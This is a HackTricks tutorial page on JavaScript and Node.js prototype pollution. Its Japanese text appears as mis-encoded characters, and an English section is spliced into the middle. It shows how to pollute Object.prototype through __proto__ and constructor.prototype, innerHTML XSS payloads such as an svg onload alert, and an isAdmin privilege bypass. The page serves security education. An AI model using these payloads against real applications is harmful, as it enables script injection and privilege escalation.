# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## JavaScriptã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ <a href="#053a" id="053a"></a>

ã¾ãšã€JavaScriptã®`Object`ã‚’ç†è§£ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã‚ã‚Šã€ã—ã°ã—ã°ãã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¨å‘¼ã°ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ï¼š

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScriptã§ã¯ã€`Object`ã¯åŸºæœ¬ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§ã‚ã‚Šã€æ–°ã—ãä½œæˆã•ã‚ŒãŸã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ã™ã€‚`Object.create`ã«`null`ã‚’æ¸¡ã™ã“ã¨ã§ç©ºã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ãŸã ã—ã€æ–°ã—ãä½œæˆã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€æ¸¡ã•ã‚ŒãŸãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«å¯¾å¿œã™ã‚‹å‹ã‚’æŒã¡ã€ã™ã¹ã¦ã®åŸºæœ¬ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

ä»¥å‰ã€ç§ãŸã¡ã¯JavaScriptã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚­ãƒ¼ã¨å€¤ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã‚ã‚‹ã“ã¨ã‚’å­¦ã³ã¾ã—ãŸã®ã§ã€`null`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯å˜ãªã‚‹ç©ºã®è¾æ›¸ã§ã‚ã‚‹ã“ã¨ã¯ç†ã«ã‹ãªã£ã¦ã„ã¾ã™: `{}`

## JavaScriptã®é–¢æ•°/ã‚¯ãƒ©ã‚¹ <a href="#55dd" id="55dd"></a>

JavaScriptã§ã¯ã€ã‚¯ãƒ©ã‚¹ã¨é–¢æ•°ã®æ¦‚å¿µã¯éå¸¸ã«é–¢é€£ã—ã¦ã„ã¾ã™ï¼ˆé–¢æ•°è‡ªä½“ãŒã‚¯ãƒ©ã‚¹ã®ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã¨ã—ã¦æ©Ÿèƒ½ã—ã€å®Ÿéš›ã®æ€§è³ªã§ã¯JavaScriptã«ã¯ã€Œã‚¯ãƒ©ã‚¹ã€ã®æ¦‚å¿µã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚æ¬¡ã®ä¾‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Node.js Proto/Prototype Pollution

Node.js applications that use user input to dynamically create objects can be vulnerable to Proto/Prototype Pollution attacks. This type of attack occurs when an attacker is able to modify the `__proto__` or `prototype` property of an object, leading to unexpected behavior or even remote code execution.

## How does Proto/Prototype Pollution work?

Proto/Prototype Pollution attacks take advantage of the way JavaScript handles object inheritance. In JavaScript, objects can inherit properties and methods from a prototype object. By modifying the `__proto__` or `prototype` property of an object, an attacker can inject malicious properties or modify existing ones.

The impact of Proto/Prototype Pollution attacks can vary depending on the specific vulnerability. In some cases, it may lead to information disclosure, privilege escalation, or even remote code execution.

## Exploiting Proto/Prototype Pollution in Node.js

To exploit Proto/Prototype Pollution in a Node.js application, an attacker needs to identify a vulnerable function that uses user input to create objects. The attacker can then craft a payload that modifies the `__proto__` or `prototype` property of an object.

There are several techniques that can be used to exploit Proto/Prototype Pollution in Node.js, including:

- Modifying the `__proto__` property directly
- Modifying the `prototype` property of a constructor function
- Exploiting chained object creation

## Prevention and Mitigation

To prevent Proto/Prototype Pollution attacks in Node.js applications, it is important to follow secure coding practices:

- Avoid using user input to dynamically create objects without proper validation and sanitization.
- Use a whitelist approach to validate and sanitize user input.
- Implement input validation and sanitization libraries, such as `validator.js` or `DOMPurify`.
- Keep Node.js and its dependencies up to date to benefit from security patches.

By following these best practices, you can reduce the risk of Proto/Prototype Pollution vulnerabilities in your Node.js applications.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptã«ãŠã‘ã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ— <a href="#3843" id="3843"></a>

æ³¨æ„ã™ã¹ãä¸€ã¤ã®ã“ã¨ã¯ã€ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹éš›ã«ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—å±æ€§ã‚’å¤‰æ›´/ä¿®æ­£/å‰Šé™¤ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ä¾‹ãˆã°ã€ã‚¯ãƒ©ã‚¹ã«é–¢æ•°ã‚’å‹•çš„ã«è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](<../../../.gitbook/assets/image (363).png>)

ã‚¯ãƒ©ã‚¹ã®é–¢æ•°ã‚‚å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ`toString`ã‚„`valueOf`ãªã©ã®å ´åˆï¼‰ï¼š

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## ç¶™æ‰¿

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ãƒ™ãƒ¼ã‚¹ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã‚¯ãƒ©ã‚¹ã‹ã‚‰ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£/ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¹ã¯ã€ä»–ã®ã‚¯ãƒ©ã‚¹ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£/ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã‹ã€ç©ºã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«è¿½åŠ ã™ã‚‹ã“ã¨ã§æ´¾ç”Ÿã—ã¾ã™ã€‚

æ³¨æ„ç‚¹ã¨ã—ã¦ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¿½åŠ ã™ã‚‹å ´åˆï¼ˆä¾‹ï¼šmyPersonObjï¼‰ã€ãã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚»ãƒƒãƒˆã«å¯¾ã—ã¦ã‚‚æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒè¿½åŠ ã•ã‚Œã¾ã™ãŒã€ãã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯æ˜ç¤ºçš„ã«å‘¼ã³å‡ºã•ã‚Œãªã„é™ã‚Šè¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ã®æ±šæŸ“ <a href="#0d0a" id="0d0a"></a>

ã™ã§ã«å­¦ã‚“ã ã¨ãŠã‚Šã€**JavaScriptã®ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯å˜ã«ã‚­ãƒ¼ã¨å€¤ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³**ã§ã‚ã‚Šã€**ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯JavaScriptã®Objectå‹ã‹ã‚‰ç¶™æ‰¿**ã•ã‚Œã‚‹ã“ã¨ã‚’è¦šãˆã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã¤ã¾ã‚Šã€Objectå‹ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€**ç’°å¢ƒå†…ã®ã™ã¹ã¦ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ±šæŸ“ã•ã‚Œã‚‹**ã¨ã„ã†ã“ã¨ã§ã™ï¼

ã“ã‚Œã¯éå¸¸ã«ã‚·ãƒ³ãƒ—ãƒ«ã§ã€ä»»æ„ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã„ãã¤ã‹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ï¼‰ã‚’å¤‰æ›´ã§ãã‚Œã°è‰¯ã„ã ã‘ã§ã™ã€‚ãªãœãªã‚‰ã€å„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯Objectã‹ã‚‰ç¶™æ‰¿ã—ã¦ã„ã‚‹ãŸã‚ã€å„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯Objectã®ã‚¹ã‚­ãƒ¼ãƒã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
å‰ã®ä¾‹ã‹ã‚‰ã€æ¬¡ã®æ–¹æ³•ã‚’ä½¿ç”¨ã—ã¦Objectã®æ§‹é€ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
ã—ãŸãŒã£ã¦ã€ä»¥å‰ã«è¿°ã¹ãŸã‚ˆã†ã«ã€ã‚‚ã—ä»Šã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¹ã‚­ãƒ¼ãƒ ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒè¿½åŠ ã•ã‚ŒãŸå ´åˆã€ã™ã¹ã¦ã®JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
## ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€JSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¹ã‚­ãƒ¼ãƒã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ã¯ã§ããªã„ãŸã‚ã€å‰ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã»ã©åŠ¹æœçš„ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãŸã ã—ã€**ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰`__proto__`ãŒç¦æ­¢ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒå½¹ç«‹ã¤ã“ã¨ãŒã‚ã‚Šã¾ã™**ã€‚

é–¢æ•°ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆã€é–¢æ•°ã®`prototype`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ã“ã“ã«è¿½åŠ ã—ãŸå„æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€ãã®é–¢æ•°ã‹ã‚‰ä½œæˆã•ã‚ŒãŸå„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ç¶™æ‰¿ã•ã‚Œã¾ã™ã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
ã“ã®å ´åˆã€`person`ã‚¯ãƒ©ã‚¹ã‹ã‚‰ä½œæˆã•ã‚ŒãŸ**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã¿**ãŒå½±éŸ¿ã‚’å—ã‘ã¾ã™ãŒã€ãã‚Œãã‚Œã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ä»Šã‚„`sayHello`ã¨`newConstant`ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’**ç¶™æ‰¿**ã—ã¾ã™ã€‚

**ã™ã¹ã¦ã®JSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ±šæŸ“ã™ã‚‹ãŸã‚ã«ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™ã€‚**

æœ€åˆã®æ–¹æ³•ã¯ã€**Object**ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ã§ã™ï¼ˆå‰è¿°ã®ã‚ˆã†ã«ã€ã™ã¹ã¦ã®JSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã“ã‚Œã‚’ç¶™æ‰¿ã—ã¦ã„ã¾ã™ï¼‰ã€‚
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
ã‚‚ã—æˆåŠŸã™ã‚Œã°ã€å„JSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯`sayBye`é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ã‚‚ã†ä¸€ã¤ã®æ–¹æ³•ã¯ã€æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«ã€è¾æ›¸å¤‰æ•°ã®ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ã§ã™ã€‚
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
ãã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€**å„JSã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ`sayHey`é–¢æ•°ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™**ã€‚

## ä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®æ±šæŸ“

### ã‚¯ãƒ©ã‚¹ã‹ã‚‰Object.prototypeã¸

ç‰¹å®šã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**æ±šæŸ“ã™ã‚‹ã“ã¨ãŒã§ã**ã€**`Object.prototype`ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚‹**ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§ãã‚Œã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### é…åˆ—è¦ç´ ã®æ±šæŸ“

JSã§ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€é…åˆ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã¯ã€**ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã«ã‚ˆã£ã¦ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªé…åˆ—ã®å€¤ã‚‚æ±šæŸ“ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼ˆå€¤ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã¯ã§ããªã„ãŸã‚ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãŒæ›¸ãè¾¼ã¾ã‚Œã¦ã„ãªã„ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’æ±šæŸ“ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Htmlè¦ç´ ã®æ±šæŸ“

JSã‚’ä½¿ç”¨ã—ã¦HTMLè¦ç´ ã‚’ç”Ÿæˆã™ã‚‹éš›ã«ã€**`innerHTML`**å±æ€§ã‚’**ä¸Šæ›¸ã**ã—ã¦ã€**ä»»æ„ã®HTMLã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãè¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚[ã“ã®è§£èª¬è¨˜äº‹ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã¨ä¾‹ã‚’å‚è€ƒã«ã—ã¾ã—ãŸ](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ã€‚

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ä¾‹

### åŸºæœ¬çš„ãªä¾‹

ã§ã¯ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã¯ã©ã“ã«ã‚ã‚Šã¾ã™ã‹ï¼Ÿãã‚Œã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒã‚°ãŒã‚ã‚‹å ´åˆã«èµ·ã“ã‚Šã¾ã™ã€‚ã“ã®ãƒã‚°ã«ã‚ˆã‚Šã€`Object.prototype`ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚é€šå¸¸ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€`Object.prototype`ã‹ã‚‰ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ç¶™æ‰¿ã—ã¦ã„ã‚‹ãŸã‚ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å‹•ä½œã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æœ€ã‚‚ä¸€èˆ¬çš„ã«ç¤ºã•ã‚Œã‚‹ä¾‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```javascript
if (user.isAdmin) {   // do something important!}
```
æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€`Object.prototype.isAdmin = true`ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒå¯èƒ½ãªãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ãŒå­˜åœ¨ã™ã‚‹ã¨ã—ã¾ã™ã€‚ãã®å ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒæ˜ç¤ºçš„ã«å€¤ã‚’å‰²ã‚Šå½“ã¦ã¦ã„ãªã„é™ã‚Šã€`user.isAdmin`ã¯å¸¸ã«trueã«ãªã‚Šã¾ã™ï¼

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

ä¾‹ãˆã°ã€`obj[a][b] = value`ã¨ã—ã¾ã™ã€‚æ”»æ’ƒè€…ãŒ`a`ã¨`value`ã®å€¤ã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã€`a`ã®å€¤ã‚’`__proto__`ã«èª¿æ•´ã™ã‚‹ã ã‘ã§ï¼ˆJavaScriptã§ã¯ã€`obj["__proto__"]`ã¨`obj.__proto__`ã¯å®Œå…¨ã«åŒç­‰ã§ã™ï¼‰ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ã™ã¹ã¦ã®æ—¢å­˜ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£`b`ãŒ`value`ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚

ãŸã ã—ã€æ”»æ’ƒã¯ä¸Šè¨˜ã®ã‚ˆã†ã«å˜ç´”ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚[è«–æ–‡](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)ã«ã‚ˆã‚‹ã¨ã€æ¬¡ã®3ã¤ã®æ¡ä»¶ã®ã„ãšã‚Œã‹ãŒæº€ãŸã•ã‚ŒãŸå ´åˆã«ã®ã¿æ”»æ’ƒãŒå¯èƒ½ã§ã™ï¼š

* å†å¸°çš„ãªãƒãƒ¼ã‚¸ã‚’å®Ÿè¡Œã™ã‚‹
* ãƒ‘ã‚¹ã«ã‚ˆã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®å®šç¾©
* ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¯ãƒ­ãƒ¼ãƒ³

### é–¢æ•°ã®ä¸Šæ›¸ã
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollutionã‚’åˆ©ç”¨ã—ãŸRCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã«ã‚ˆã‚‹XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: jQuery $ .extendã‚’ä»‹ã—ãŸãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒ

$ .extendã¯ã€èª¤ã£ã¦å‡¦ç†ã•ã‚Œã‚‹ã¨ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ`prototype`ï¼ˆã‚¢ãƒ—ãƒªå†…ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼‰ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®å±æ€§ã¯ã€ãã®å¾Œã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ãªãŠã€$ .extendã®ã€Œæ·±ã„ã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆã¤ã¾ã‚Šgï¼‰ã®ã¿ãŒå½±éŸ¿ã‚’å—ã‘ã¾ã™ã€‚

ãƒ—ãƒ­ã‚°ãƒ©ãƒãƒ¼ã¯ã€ã“ã®é–¢æ•°ã‚’ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®è¤‡è£½ã‚„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã®æ–°ã—ã„ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®å…¥åŠ›ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š

